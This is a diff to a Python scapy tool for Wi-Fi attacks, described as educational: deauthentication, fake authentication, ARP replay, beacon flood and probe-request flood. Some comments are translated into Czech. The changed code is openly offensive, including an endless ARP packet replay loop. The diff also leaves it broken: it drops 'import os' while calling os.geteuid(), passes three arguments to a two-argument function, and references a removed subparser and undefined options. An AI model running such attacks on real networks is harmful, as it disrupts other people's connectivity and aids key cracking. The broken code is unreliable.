@@ -1,7 +1,6 @@
 #!/usr/bin/env python3
 import argparse
 import sys
-import os
 import random
 import time
 import threading
@@ -77,18 +76,18 @@ def fake_auth_attack(iface, ap_mac, your_mac, count=10):
         print_warn("Fake Auth attack interrupted by user")
     print_good(f"Fake Auth attack finished, total packets sent: {sent}")
     
-# ================== ARP REPLAY ATTACK ==================
+# ================== ARP REPLAY ATTACK jako aireplay-ng ==================
 def arp_replay_attack(iface, pcap_file):
     print_info(f"Starting ARP Replay attack with packet from '{pcap_file}' on interface {iface}")
     packets = rdpcap(pcap_file)
-    # Find the first ARP request in the pcap
+    # Najdeme první ARP request v pcapu
     arp_packet = None
     for pkt in packets:
         if ARP in pkt and pkt[ARP].op == 1:  # who-has request
             arp_packet = pkt
             break
     if arp_packet is None:
-        print_error("No ARP request packet found in the pcap file!")
+        print_fail("No ARP request packet found in the pcap file!")
         return
 
     print_info("Using following ARP request packet for replay:")
@@ -98,7 +97,7 @@ def arp_replay_attack(iface, pcap_file):
         while True:
             sendp(arp_packet, iface=iface, verbose=0)
             print_info("Sent ARP replay packet")
-            time.sleep(0.05)  # approx 20 packets per second
+            time.sleep(0.05)  # cca 20 paketů za sekundu
     except KeyboardInterrupt:
         print_warn("ARP Replay attack interrupted by user")
 
@@ -178,8 +177,6 @@ def probe_request_flood(iface):
 def parse_args():
     parser = argparse.ArgumentParser(description="Advanced WiFi attacks tool for educational use (Linux only)")
 
-    subparsers = parser.add_subparsers(dest='command')
-
     # Deauth attack
     parser.add_argument("--deauth", action='store_true', help="Perform Deauth attack")
     parser.add_argument("-n", type=int, default=10, help="Number of packets to send (-1 for infinite)")
@@ -195,6 +192,7 @@ def parse_args():
     arpreplay_parser.add_argument("-r", "--pcap", required=True, help="PCAP file with ARP request packet to replay")
     arpreplay_parser.add_argument("iface", help="Interface to use")
 
+
     # Beacon flood
     parser.add_argument("--beacon", action='store_true', help="Perform Beacon Flood attack")
     parser.add_argument("-f", metavar="SSID_FILE", help="File containing list of SSIDs for beacon flood")
@@ -202,8 +200,8 @@ def parse_args():
     # Probe request flood
     parser.add_argument("--probe", action='store_true', help="Perform Probe Request Flood attack")
 
-    # Interface (mandatory for all attacks except arpreplay subcommand)
-    parser.add_argument("interface", nargs='?', help="Wireless interface in monitor mode")
+    # Interface (mandatory for all attacks)
+    parser.add_argument("interface", help="Wireless interface in monitor mode")
 
     args = parser.parse_args()
 
@@ -211,22 +209,16 @@ def parse_args():
     if args.deauth:
         if not args.a:
             parser.error("Deauth attack requires -a <AP_MAC>")
-        if not args.interface:
-            parser.error("Interface is required for deauth attack")
     if args.fakeauth:
         if not args.a or not args.m:
             parser.error("Fakeauth requires -a <AP_MAC> and -m <Your MAC>")
-        if not args.interface:
-            parser.error("Interface is required for fakeauth attack")
+    if args.arpreplay:
+        if not args.b or not args.m:
+            parser.error("ARPreplay requires -b <AP_MAC> and -m <Your MAC>")
     if args.beacon:
         if not args.f:
             parser.error("Beacon flood requires -f <SSID file>")
-        if not args.interface:
-            parser.error("Interface is required for beacon flood")
-    if args.probe:
-        if not args.interface:
-            parser.error("Interface is required for probe request flood")
-    if not (args.deauth or args.fakeauth or args.beacon or args.probe or args.command == "arpreplay"):
+    if not (args.deauth or args.fakeauth or args.arpreplay or args.beacon or args.probe):
         parser.error("You must specify at least one attack mode (--deauth, --fakeauth, --arpreplay, --beacon, --probe)")
 
     return args
@@ -239,15 +231,18 @@ def main():
         deauth_attack(args.interface, args.a.lower(), args.c.lower() if args.c else None, args.n)
     elif args.fakeauth:
         fake_auth_attack(args.interface, args.a.lower(), args.m.lower(), args.n)
-    elif args.command == "arpreplay":
-        arp_replay_attack(args.iface, args.pcap)
+    elif args.arpreplay:
+        arp_replay_attack(args.interface, args.b.lower(), args.m.lower())
     elif args.beacon:
         beacon_flood(args.interface, args.f)
     elif args.probe:
         probe_request_flood(args.interface)
     else:
-        print_error("No valid attack mode specified.")
-        sys.exit(1)
+        print_error("No valid attack selected")
 
 if __name__ == "__main__":
+    # Ensure running as root
+    if os.geteuid() != 0:
+        print_error("You need to run this script as root")
+        sys.exit(1)
     main()
